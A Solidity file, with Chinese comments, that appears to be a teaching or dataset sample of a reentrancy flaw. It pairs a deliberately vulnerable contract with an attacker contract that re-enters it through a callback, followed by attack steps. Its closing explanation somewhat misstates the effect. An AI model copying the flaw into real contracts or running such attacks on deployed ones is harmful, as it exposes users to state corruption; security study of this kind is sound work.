// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

// 介面定義，供外部呼叫使用
interface ICalled {
    function f() external;
}

// 漏洞合約：Unsafe System State Changes
// 漏洞重點：
// (1) 狀態變數 counter 在呼叫外部合約函式之前被更新，但在事件 emit 之前執行外部呼叫，
//     使得攻擊者在回調(f)時可以利用 reentrancy 技術，造成系統狀態處於非預期狀態。
contract VulnerableContract {
    uint public counter; // 狀態變數（漏洞關鍵點）

    event Counter(uint counter);

    // 漏洞函式：
    // 先更新狀態，接著呼叫外部合約 d.f()，再 emit 事件。
    // 攻擊者可藉由回調觸發安全檢查不足，導致系統的狀態發生非預期變化。
    function bug(ICalled d) public {
        counter += 1; // 狀態更新
        // 漏洞：在事件 emit 前呼叫外部合約，可能出現不期望的重入情形
        d.f();
        emit Counter(counter);
    }
}

// 攻擊者合約：利用 VulnerableContract 的重入漏洞發動攻擊
contract Attacker is ICalled {
    VulnerableContract public vulnerable;
    uint public attackCount;

    // 在部署 Attacker 時，必須傳入 VulnerableContract 的地址
    constructor(address _vulnerable) {
        vulnerable = VulnerableContract(_vulnerable);
    }

    // 攻擊入口：呼叫 VulnerableContract.bug() 並傳入自身地址
    function attack() public {
        vulnerable.bug(this);
    }

    // 回調函式：當 VulnerableContract 呼叫 d.f() 時，此函式被觸發
    // 利用回調觸發重入，重新呼叫 VulnerableContract.bug()，造成多次未經預期的狀態變更
    function f() external override {
        if (attackCount < 2) { // 限制攻擊深度避免無限循環
            attackCount++;
            vulnerable.bug(this);
        }
    }
}

/*
部署及攻擊步驟：
1. 部署 VulnerableContract。
2. 部署 Attacker 並傳入 VulnerableContract 的地址。
3. 呼叫 Attacker.attack() 發動攻擊。

攻擊說明：
由於 bug() 函式在 emit 事件之前執行外部呼叫，攻擊者可在回調中多次調用 bug()，
從而使得 counter 狀態變數在多筆交易前未正確記錄，導致整個系統進入非預期狀態，
可能引發性能或可用性問題。
*/